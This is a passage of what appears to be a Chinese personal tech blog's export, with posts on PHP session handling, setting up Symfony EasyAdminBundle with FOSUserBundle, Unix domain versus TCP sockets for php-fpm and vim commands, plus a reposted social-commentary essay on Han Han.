<h5 id="PHP版本-lt-5-4-0"><a href="#PHP版本-lt-5-4-0" class="headerlink" title="PHP版本 &lt; 5.4.0"></a>PHP版本 &lt; 5.4.0</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// 通过session_id亦可适用于高版本</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">session_id</span>() == <span class="string">&#x27;&#x27;</span>) &#123; </span><br><span class="line">        <span class="title function_ invoke__">session_start</span>(); </span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="PHP版本-gt-5-4-0"><a href="#PHP版本-gt-5-4-0" class="headerlink" title="PHP版本 &gt;= 5.4.0"></a>PHP版本 &gt;= 5.4.0</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// session_status最低只支持5.4.0的PHP版本</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">session_status</span>() == PHP_SESSION_NONE) &#123; </span><br><span class="line">        <span class="title function_ invoke__">session_start</span>(); </span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>即:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// 检测session是否开启</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hasSessionStarted</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">version_compare</span>(<span class="title function_ invoke__">phpversion</span>(), <span class="string">&#x27;5.4.0&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$session_id</span> = <span class="title function_ invoke__">session_id</span>();</span><br><span class="line">            <span class="keyword">return</span> !<span class="keyword">empty</span>(<span class="variable">$session_id</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">session_status</span>() != PHP_SESSION_NONE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h3 id="session-destrory-完整的logout姿势"><a href="#session-destrory-完整的logout姿势" class="headerlink" title="session destrory(完整的logout姿势)"></a>session destrory(完整的logout姿势)</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// 重置会话中的所有变量</span></span><br><span class="line">    <span class="variable">$_SESSION</span> = <span class="keyword">array</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 如果要清理的更彻底，那么同时删除会话 cookie</span></span><br><span class="line">    <span class="comment">// 注意：这样不但销毁了会话中的数据，还同时销毁了会话本身</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;session.use_cookies&quot;</span>)) &#123;</span><br><span class="line">        <span class="variable">$params</span> = <span class="title function_ invoke__">session_get_cookie_params</span>();</span><br><span class="line">        <span class="title function_ invoke__">setcookie</span>(<span class="title function_ invoke__">session_name</span>(), <span class="string">&#x27;&#x27;</span>, <span class="title function_ invoke__">time</span>() - <span class="number">42000</span>,</span><br><span class="line">            <span class="variable">$params</span>[<span class="string">&quot;path&quot;</span>], <span class="variable">$params</span>[<span class="string">&quot;domain&quot;</span>],</span><br><span class="line">            <span class="variable">$params</span>[<span class="string">&quot;secure&quot;</span>], <span class="variable">$params</span>[<span class="string">&quot;httponly&quot;</span>]</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 最后，销毁会话</span></span><br><span class="line">    <span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>笔记</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>session</tag>
      </tags>
  </entry>
  <entry>
    <title>Symfony EasyAdminBundle初体验</title>
    <url>/2016/12/21/symfony-easyadmin-begin/</url>
    <content><![CDATA[<h2 id="安装symfony"><a href="#安装symfony" class="headerlink" title="安装symfony"></a>安装<a href="http://symfony.com/doc/current/setup.html">symfony</a></h2><h3 id="Linux-OSX"><a href="#Linux-OSX" class="headerlink" title="Linux/OSX"></a>Linux/OSX</h3><ul>
<li>  <code>$ sudo curl -LsS https://symfony.com/installer -o /usr/local/bin/symfony</code></li>
<li>  <code>$ sudo chmod a+x /usr/local/bin/symfony</code></li>
</ul>
<h3 id="OSX"><a href="#OSX" class="headerlink" title="OSX"></a>OSX</h3><ul>
<li>  <code>$ brew install homebrew/php/symfony-installer</code></li>
</ul>
<h2 id="新建symfony项目"><a href="#新建symfony项目" class="headerlink" title="新建symfony项目"></a>新建symfony项目</h2><p><code>$ symfony new my_project_name [version]</code>  </p>
<p>symfony 3.0 开始需PHP版本不低于5.5.9, 2.x版本支持PHP 5.3.x版本, 需要根据自己的PHP版本来确定symfony项目的版本, version参数不加默认是master分支, 具体可查 <a href="https://github.com/symfony/symfony/blob/master/composer.json">symfony的composer.json文件</a> </p>
<p>也可用composer方式新建项目: <code>composer create-project symfony/framework-standard-edition my_project_name &quot;[version]&quot;</code>  </p>
<p>测试项目是否初始化成功</p>
<ul>
<li>  进入到 <code>my_project_name</code> 文件夹  </li>
<li>  启动php内置web服务 <code>php bin/console server:run</code></li>
<li> 访问 <code>http://localhost:8000</code> 即可看到symfony欢迎页面</li>
</ul>
<p><strong>注: symfony 3.0之前的版本console文件路径是 app/console, 之后的是 bin/console, 下文默认使用3.0后的版本, 如果你的环境是2.x版本则需改为 app/console</strong></p>
<h2 id="初始化数据库"><a href="#初始化数据库" class="headerlink" title="初始化数据库"></a>初始化数据库</h2><p><strong>注: 若数据库已存在则不需要这个过程, 只需将配置文件中 database_name 字段修改为所用数据库名称</strong></p>
<h3 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h3><p>编辑 app/config/parameters.yml, 修改 <code>database_</code> 相关字段的配置</p>
<span id="more"></span>
<h3 id="生成数据库"><a href="#生成数据库" class="headerlink" title="生成数据库"></a>生成数据库</h3><p><code>$ php bin/console doctrine:database:create --if-not-exists</code><br>此处使用 <a href="https://github.com/doctrine/doctrine2">doctrine orm</a> 框架来实现</p>
<h2 id="使用-FOSUserBundle"><a href="#使用-FOSUserBundle" class="headerlink" title="使用 FOSUserBundle"></a>使用 <a href="https://github.com/FriendsOfSymfony/FOSUserBundle">FOSUserBundle</a></h2><p>FOSUserBundle 是symfony框架用于用户身份验证的模块, 类似于 laravel的auth模块</p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p><code>$ composer require friendsofsymfony/user-bundle &quot;~2.0@dev&quot;</code><br>此处需根据自己php版本来选择相应的版本安装</p>
<h3 id="注册模块"><a href="#注册模块" class="headerlink" title="注册模块"></a>注册模块</h3><p>AppKernel.php 文件中增加FOSUserBundle模块  </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// app/AppKernel.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">registerBundles</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$bundles</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        <span class="keyword">new</span> FOS\UserBundle\<span class="title function_ invoke__">FOSUserBundle</span>(),</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="调整User类"><a href="#调整User类" class="headerlink" title="调整User类"></a>调整User类</h3><p>修改 src/AppBundle/Entity/User.php 文件，引入FOSUserBundle User类       </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// src/AppBundle/Entity/User.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">AppBundle</span>\<span class="title class_">Entity</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">FOS</span>\<span class="title">UserBundle</span>\<span class="title">Model</span>\<span class="title">User</span> <span class="keyword">as</span> <span class="title">BaseUser</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Doctrine</span>\<span class="title">ORM</span>\<span class="title">Mapping</span> <span class="keyword">as</span> <span class="title">ORM</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@ORM</span>\Entity</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@ORM</span>\Table(name=&quot;fos_user&quot;)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">BaseUser</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@ORM</span>\Id</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@ORM</span>\Column(type=&quot;integer&quot;)</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@ORM</span>\GeneratedValue(strategy=&quot;AUTO&quot;)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>();</span><br><span class="line">        <span class="comment">// your own logic</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>

<h3 id="调整-security-yml"><a href="#调整-security-yml" class="headerlink" title="调整 security.yml"></a>调整 security.yml</h3><p>security.yml文件是项目基础身份认证的配置文件, 需要在此引入FOSUserBundle       </p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># app/config/security.yml</span></span><br><span class="line"><span class="attr">security:</span></span><br><span class="line">    <span class="attr">encoders:</span></span><br><span class="line">        <span class="string">FOS\UserBundle\Model\UserInterface:</span> <span class="string">bcrypt</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">role_hierarchy:</span></span><br><span class="line">        <span class="attr">ROLE_ADMIN:</span>       <span class="string">ROLE_USER</span></span><br><span class="line">        <span class="attr">ROLE_SUPER_ADMIN:</span> <span class="string">ROLE_ADMIN</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">providers:</span></span><br><span class="line">        <span class="attr">fos_userbundle:</span></span><br><span class="line">            <span class="attr">id:</span> <span class="string">fos_user.user_provider.username</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">firewalls:</span></span><br><span class="line">        <span class="attr">main:</span></span><br><span class="line">            <span class="attr">pattern:</span> <span class="string">^/</span></span><br><span class="line">            <span class="attr">form_login:</span></span><br><span class="line">                <span class="attr">provider:</span> <span class="string">fos_userbundle</span></span><br><span class="line">                <span class="attr">csrf_token_generator:</span> <span class="string">security.csrf.token_manager</span></span><br><span class="line">                <span class="comment"># if you are using Symfony &lt; 2.8, use the following config instead:</span></span><br><span class="line">                <span class="comment"># csrf_provider: form.csrf_provider</span></span><br><span class="line"></span><br><span class="line">            <span class="attr">logout:</span>       <span class="literal">true</span></span><br><span class="line">            <span class="attr">anonymous:</span>    <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">access_control:</span></span><br><span class="line">        <span class="bullet">-</span> &#123; <span class="attr">path:</span> <span class="string">^/login$</span>, <span class="attr">role:</span> <span class="string">IS_AUTHENTICATED_ANONYMOUSLY</span> &#125;</span><br><span class="line">        <span class="bullet">-</span> &#123; <span class="attr">path:</span> <span class="string">^/register</span>, <span class="attr">role:</span> <span class="string">IS_AUTHENTICATED_ANONYMOUSLY</span> &#125;</span><br><span class="line">        <span class="bullet">-</span> &#123; <span class="attr">path:</span> <span class="string">^/resetting</span>, <span class="attr">role:</span> <span class="string">IS_AUTHENTICATED_ANONYMOUSLY</span> &#125;</span><br><span class="line">        <span class="bullet">-</span> &#123; <span class="attr">path:</span> <span class="string">^/admin/</span>, <span class="attr">role:</span> <span class="string">ROLE_ADMIN</span> &#125;</span><br><span class="line">        </span><br></pre></td></tr></table></figure>

<h3 id="调整-config-yml"><a href="#调整-config-yml" class="headerlink" title="调整 config.yml"></a>调整 config.yml</h3><p>上一步修改的 security.yml 文件中 <code>providers</code> 选项下 <code>id: fos_user.user_provider.username</code>, 现在是要做 <code>fos_user</code> 这个id的配置 </p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># app/config/config.yml</span></span><br><span class="line"><span class="attr">fos_user:</span></span><br><span class="line">    <span class="attr">db_driver:</span> <span class="string">orm</span> <span class="comment"># other valid values are &#x27;mongodb&#x27; and &#x27;couchdb&#x27;, 同之前配置</span></span><br><span class="line">    <span class="attr">firewall_name:</span> <span class="string">main</span>     <span class="string">//</span> <span class="string">同上一步中firewalls配置</span></span><br><span class="line">    <span class="attr">user_class:</span> <span class="string">AppBundle\Entity\User</span>   <span class="string">//</span> <span class="string">同前面调整的User类</span></span><br></pre></td></tr></table></figure>

<h3 id="调整-routing-yml"><a href="#调整-routing-yml" class="headerlink" title="调整 routing.yml"></a>调整 routing.yml</h3><p>routing.yml 文件负责项目路由规则，这一步引入 FOSUserBundle 路由规则 </p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># app/config/routing.yml</span></span><br><span class="line"><span class="attr">fos_user:</span></span><br><span class="line">    <span class="attr">resource:</span> <span class="string">&quot;@FOSUserBundle/Resources/config/routing/all.xml&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="更新数据库"><a href="#更新数据库" class="headerlink" title="更新数据库"></a>更新数据库</h3><p><code>$ php bin/console doctrine:schema:update --force</code>  </p>
<p>这一步会在数据库中创建<code>fos_user</code>表, 表名在前面 User 类中配置 <code>@ORM\Table(name=&quot;fos_user&quot;)</code>, 可修改为你所需要的名称</p>
<h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p>访问 <code>http://localhost:8000/login</code> 页面, 会出现登录框, 不过好丑</p>
<h3 id="增加测试用户"><a href="#增加测试用户" class="headerlink" title="增加测试用户"></a>增加测试用户</h3><p><code>$ php bin/console fos:user:create admin admin@local 123456</code><br><code>$ php bin/console fos:user:promote admin ROLE_ADMIN</code></p>
<p>这步会向 fos_user 表中插入一条数据, 用户名: admin, 密码: 123456, 并且设置该用户为admin角色, 供之后登录测试用</p>
<h2 id="使用-EasyAdminBundle"><a href="#使用-EasyAdminBundle" class="headerlink" title="使用 EasyAdminBundle"></a>使用 <a href="https://github.com/javiereguiluz/EasyAdminBundle">EasyAdminBundle</a></h2><p>EasyAdminBundle包是symfony框架下一个简单易用可扩展的后台</p>
<h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><p><code>$ composer require javiereguiluz/easyadmin-bundle</code></p>
<h3 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h3><ol>
<li><p>引入 app/AppKernel.php</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// app/AppKernel.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">registerBundles</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$bundles</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        <span class="keyword">new</span> FOS\UserBundle\<span class="title function_ invoke__">FOSUserBundle</span>(),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">JavierEguiluz\Bundle\EasyAdminBundle\EasyAdminBundle</span>(),</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>引入 app/config/routing.yml</p>
 <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># app/config/routing.yml</span></span><br><span class="line"><span class="attr">easy_admin_bundle:</span></span><br><span class="line">    <span class="attr">resource:</span> <span class="string">&quot;@EasyAdminBundle/Controller/&quot;</span></span><br><span class="line">    <span class="attr">type:</span>     <span class="string">annotation</span></span><br><span class="line">    <span class="attr">prefix:</span>   <span class="string">/admin</span>        <span class="string">//</span> <span class="string">设置admin为后台目录</span></span><br></pre></td></tr></table></figure></li>
<li><p>  引入资源文件<br><code>$ php bin/console assets:install --symlink</code></p>
</li>
<li><p>配置<br> 编辑 app/config/config.yml, 配置EasyAdminBundle, 加入前面配置的 AppBundle\Entity\User</p>
 <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># app/config/config.yml</span></span><br><span class="line"><span class="attr">easy_admin:</span></span><br><span class="line">    <span class="attr">entities:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">AppBundle\Entity\User</span></span><br></pre></td></tr></table></figure></li>
</ol>
<pre><code>访问 `http://localhost:8000/login`, 输入之前插入的admin用户名密码, 登录成功会跳转至 `http://localhost:8000/admin` 页面,  至此就完成了 EasyAdminBundle 的安装, 左侧栏只有上一步 `config.yaml` 中设置的 User 菜单

如果你已经建立好项目所需的表, 需要使用 symfony 根据已存在的表生成 Entity
</code></pre>
<h2 id="引入已存在的数据表"><a href="#引入已存在的数据表" class="headerlink" title="引入已存在的数据表"></a>引入已存在的数据表</h2><ol>
<li>table to xml<br> <code>$ php bin/console doctrine:mapping:import --force AppBundle xml</code>   </li>
</ol>
<pre><code>这一步使用Doctrine生成数据库中独立的含有表结构信息等特殊结构的xml文件, 目录在 src/AppBundle/Resources/config/doctrine/ , 这个路径需根据自己项目路径确定
</code></pre>
<ol start="2">
<li>xml to Entity<br> <code>$ php bin/console doctrine:generate:entities AcmeBlogBundle</code>   </li>
</ol>
<pre><code>根据上一步生成的xml文件生成相应的 Entity 文件

**注: 这一步会生成所有表对应的Entity文件, 之前已存在 Entity\User 文件, 默认不覆盖, 会生成一个 Entity\User.php~ 文件, 可直接删掉此文件, 如果某种原因覆盖掉了, 需根据前面步骤重新在 Entity\User 文件中引入FOSUserBundle**

可能还会报另一个错 `[Doctrine\ORM\Mapping\MappingException] Duplicate definition of column &#39;username&#39; on entity &#39;AppBundle\Entity\User&#39; in a field or discriminator column mapping.`, 可能是两个原因导致:     
*   如果`AppBundle\Entity\User.php`文件是根据xml文件生成, 则文件中会定义有`username`, `email`等字段, 而`FOS\UserBundle\Model\User`类中已定义有这些字段, 故报错
*   如果没有使用xml生成的`AppBundle\Entity\User.php`, 则是`AppBundle/Resources/config/doctrine/User.orm.xml`文件中重复定义所导致     

解决方法: 删除`User.orm.xml`文件中跟`FOS\UserBundle\Model\User`有冲突的字段即可
</code></pre>
<ol start="3">
<li>配置菜单<br> 修改 app/config/config.yml, 引入各个 Entity   </li>
</ol>
<pre><code><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># app/config/config.yml</span></span><br><span class="line"><span class="attr">easy_admin:</span></span><br><span class="line">    <span class="attr">entities:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">AppBundle\Entity\User</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">AppBundle\Entity\Post</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">AppBundle\Entity\Comment</span></span><br><span class="line">        <span class="string">...</span></span><br></pre></td></tr></table></figure>
</code></pre>
<br/>
刷新admin页面即可看到左侧菜单已增加, bingo!

<p><br/><br/><br/><br/><br>参考资料: </p>
<blockquote>
<ul>
<li>Symfony2 Admin panel in 30 seconds <a href="https://level7systems.co.uk/symfony2-admin-panel-in-30-seconds/">https://level7systems.co.uk/symfony2-admin-panel-in-30-seconds/</a></li>
<li>使用FOSUserBundle <a href="https://symfony.com/doc/master/bundles/FOSUserBundle/index.html">https://symfony.com/doc/master/bundles/FOSUserBundle/index.html</a></li>
<li>安装Symfony <a href="http://symfony.com/doc/current/setup.html">http://symfony.com/doc/current/setup.html</a></li>
<li>使用EasyAdminBundle <a href="https://github.com/javiereguiluz/EasyAdminBundle">https://github.com/javiereguiluz/EasyAdminBundle</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>symfony</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>symfony</tag>
      </tags>
  </entry>
  <entry>
    <title>许知远：庸众的胜利</title>
    <url>/2017/01/17/the-victory-of-mediocre-persons/</url>
    <content><![CDATA[<blockquote>
<p>文: 许知远<br>来源: 凤凰网<br>链接: <a href="http://book.ifeng.com/culture/1/detail_2010_05/11/1504069_0.shtml">http://book.ifeng.com/culture/1/detail_2010_05/11/1504069_0.shtml</a> </p>
</blockquote>
<p>大约三十年前，当法国学生们被问道，谁是他们最仰慕的公众人物时，他们选择的不是老年萨特，而是米歇尔.科卢奇——一位电视喜剧演员，以嘲讽和出言不逊著称。</p>
<p>时代的风尚转变了，六十年代的理想主义、改变世界的愿望，让位于七十年代的幻灭与狭隘的个人主义。嘲讽成了时代的情绪，人们在乎的是姿态，而不是内容。</p>
<p>此刻的中国，人人都在谈论韩寒。他像是越来越压抑、越来越迷惘的时代的最后救命稻草。上了年纪的知识分子说他头脑清醒，媒体欢呼他是“青年领袖”、“年度人物”，青年人觉得他不仅很酷，还有思想。</p>
<p>没人能否认韩寒的魅力。他能把赛车冠军、畅销书作家、叛逆小子和即兴讽刺者等多重的角色结合，并能在种种诱惑面前保持警惕，况且他才二十七岁。人们尤其着迷于最后一点，他在自己全球浏览量第一的博客上，嘲讽这社会中的种种愚蠢和不公——它们绝大多数与这个越来越膨胀和傲慢的官僚系统相关。有些时候，他不仅嘲讽，还期待创造意义，尽管他还不清楚这意义到底是什么。</p>
<p>作为一个青年人，这似乎已经足了，他必定是我们时代最可爱、最聪明的明星人物。但很多人(包括一些自认有思想的人)把他推到了一个令他本人都尴尬的位置——他要成为这个时代的英雄，象征着思想的力量，象征着对权力的反抗。</p>
<p>但这不是韩寒，人们越是把他推向这个位置，越暴露出这个时代、这些高声吶喊者的愚蠢、脆弱与怯懦。在某种意义上，韩寒的胜利不是他个人的胜利，而是这个正在兴起的庸众时代的胜利。</p>
<p>是的，你可以说每个杰出人物必然与他身处的时代相关联，但一种越来越明显的趋势是——名声和有影响力越来越与个人的质量、才能与成就无关。在西方，这是个Paris Hilton和苏珊大妈的年代——她因为有名而有名，因为不怕出丑而有名。在中国，这是个李宇春与小沈阳的年代——人们因她小小的个性，或是他的自我贬损，而把票投给他们。</p>
<p>韩寒与他们不同，却也是被同样一种力量推到今天的舞台。他是这个时代明星文化与成功文化的产物，也符合这个时代所推崇的业余精神——赛车、写作、表演，你都要会一点；他还下意识响应了日趋悤烈的反智倾向，他的文章总是如此浅显直白，没有任何阅读障碍，也不会提到任何你不知道的知识；还有他嘲讽式的挑衅姿态，显得如此机智，他还熟知挑战的分寸，绝不真正越政治雷池一步；他也从来不暴露自己内心的焦灼与困惑，很酷……</p>
<span id="more"></span>

<p>于是谈论韩寒，变成了一次全方位的心理按摩。你沐浴了青春、酷、成功、机智、还觉得自己参与了一场反抗，同时又是如此安全，你不需要付出任何智力上、道德上的代价，也没有任何精神上的仿徨，他是这个社会最美妙的消费品。</p>
<p>但世上真有如此美事吗？用LXB来比较韩寒，既不恰当也不公平。但是，公众对两者的态度，却恰好不过的映衬了这个时代的特征。人们不谈论LXB，是因为他的名字不能出现在公共话语空间，也因为这有点危险。但集体性地沉默与忽视也在表明，其实我们对于真正的自由与反抗毫无兴趣，甚至心生恐惧。自由是需要付出代价的，它不仅要反抗，而且有明确的主张。这需要智力与情感上的成熟，并愿意为自己的决定承担后果。</p>
<p>对于韩寒的热烈推崇，是整个社会拒绝付出代价的标志。当我们沉浸于只言词组的嘲讽时，一定误以为自己已消解了这可恶的权力体制，其实一点没变，嘲讽只是为上面裹了一层糖衣，但我们进行自我麻醉，还将此视作一次反抗。</p>
<p>而且，人们或许也觉得，韩寒也不需要为行动承担任何后果，他可以进行象征性、边缘性的反抗了，然后还全身而退，像是去商场进行一次购物。韩寒成了所有人的借口，人们借着他撒娇，卖弄自己那可怜的“小心思”。</p>
<p>但公众必定为这种愚蠢和怯懦付出代价。既然他们对于真正的成就缺乏兴趣，不去赞叹那些卓绝的道德勇气，不去准备接纳真正的思想，他们就只能在这个烂泥塘中继续打转，相互抱怨、相互麻痹。因为这庸众的数量是如此的巨大，他们还会产生这样的错觉——中国已经影响世界。中国的确影响了世界，但它只是数量上的造就，而非真正值得尊敬的成就。韩寒掀起的迷狂，衬托出这个崛起大国的内在苍白、可悲、浅薄——一个聪明的青年人、说出了一些真话，他就让这个时代的神经震颤不已。与其说这是韩寒的胜利，不如说是庸众的胜利，或是整个民族的失败。</p>
]]></content>
      <categories>
        <category>社会</category>
      </categories>
  </entry>
  <entry>
    <title>Unix Domain Socket vs TCP SOCKET</title>
    <url>/2017/06/20/unix-domain-socket-vs-tcp-socket/</url>
    <content><![CDATA[<p>之前配置lnmp环境时有发现php-fpm既可以监听<code>127.0.0.1:9000</code>(ip+端口形式), 也可以监听<code>/path/to/unix/socket</code>(Unix Domain Socket形式), 用起来感觉并没有什么差异, 网上查下了资料，大略总结下。</p>
<h2 id="Unix-Domain-Socket"><a href="#Unix-Domain-Socket" class="headerlink" title="Unix Domain Socket"></a>Unix Domain Socket</h2><blockquote>
<p>Unix domain socket 或者 IPC socket是一种终端，可以使 <strong>同一台操作系统</strong> 上的两个或多个进程进行数据通信。与管道相比，Unix domain sockets 既可以使用字节流，又可以使用数据队列，而管道通信则只能使用字节流。Unix domain sockets的接口和Internet socket很像，但它不使用网络底层协议来通信。Unix domain socket 的功能是POSIX操作系统里的一种组件。</p>
</blockquote>
<blockquote>
<p>Unix domain sockets <strong>使用系统文件的地址来作为自己的身份</strong>。它可以被系统进程引用。所以两个进程可以同时打开一个Unix domain sockets来进行通信。不过这种通信方式是发生在系统内核里而不会在网络里传播。</p>
</blockquote>
<h3 id="同一台操作系统"><a href="#同一台操作系统" class="headerlink" title="同一台操作系统"></a>同一台操作系统</h3><ul>
<li>直接弊端: 限定UDS的使用只能在同一台服务器，<strong>即限定Nginx和php必须部署在同一台机</strong>。</li>
</ul>
<h3 id="系统文件标识身份"><a href="#系统文件标识身份" class="headerlink" title="系统文件标识身份"></a>系统文件标识身份</h3><ul>
<li>方便利用linux的文件访问权限机制，来控制进程的访问权限。如Nginx运行用户为www, 则该socket文件必须对www用户有读写的权限，而其他没有读写权限的进程无法与php-fpm进程通信。</li>
<li><em>less copying of data, fewer context switches</em>。相比基于TCP/IP协议栈的形式，UDS减少了如数据安全校验、路由、流量控制、封包解包等操作的性能消耗，在性能表现方面略高，不过这方面的性能优势只是理论上的，实际线上环境的差异应该不大。<span id="more"></span>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3></li>
<li>网上看到一个很脑洞的UDS使用<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upstream backend </span><br><span class="line">&#123;</span><br><span class="line">    server unix:/var/run/php5-fpm.sock1  weight=100 max_fails=5 fail_timeout=5;</span><br><span class="line">    server unix:/var/run/php5-fpm.sock2  weight=100 max_fails=5 fail_timeout=5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>在同一台服务器php-fpm配置两个或更多UDS文件配合Nginx做负载均衡, 性能会略高于普通的单个的upstream backends。</p>
<h2 id="所以如何选择？"><a href="#所以如何选择？" class="headerlink" title="所以如何选择？"></a>所以如何选择？</h2><ul>
<li>php只有一台服务器且与Nginx在同一台机，建议使用Unix Domain Socket方式，性能会略高于TCP/IP，不过基本看不出来差异</li>
<li>其他情况就只能监听ip+端口号, 没得选 :)</li>
</ul>
<p><br/><br/><br>参考资料：</p>
<blockquote>
<p><a href="https://lists.freebsd.org/pipermail/freebsd-performance/2005-February/001143.html">unix domain sockets vs. internet sockets</a></p>
</blockquote>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>unix domain socket</tag>
        <tag>tcp/ip</tag>
        <tag>php-fpm</tag>
      </tags>
  </entry>
  <entry>
    <title>vim常用命令</title>
    <url>/2016/12/19/vim-command/</url>
    <content><![CDATA[<p>vim常用命令</p>
<ul>
<li><p>  列编辑<br>鼠标移动到对应位置，ctrl+v进入列编辑选中要修改的块，shift+i进入编辑模式，输入内容，第一行变化，连续按两次 esc 键，刚才列编辑选中的所有行都发生变化</p>
</li>
<li><p>折叠与展开</p>
<ul>
<li>  zi 打开关闭折叠</li>
<li>  zv 查看此行</li>
<li>  zm 关闭折叠</li>
<li>  zM 关闭所有</li>
<li>  zr 打开</li>
<li>  zR 打开所有</li>
<li>  zc 折叠当前行</li>
<li>  zo 打开当前折叠</li>
<li>  zd 删除折叠</li>
<li>  zD 删除所有折叠</li>
</ul>
</li>
<li><p>  代码缩进与格式化<br>根据语言特征使用自动缩进排版：在命令状态下对当前行用== （连按=两次）, 或对多行用n==（n是自然数）表示自动缩进从当前行起的下面n行</p>
</li>
<li><p>翻页与移动   </p>
<ul>
<li>page up: ctrl+b</li>
<li>page down: ctrl+f</li>
<li>行首：0</li>
<li>行尾：$</li>
<li>定位到第几行：数字＋G</li>
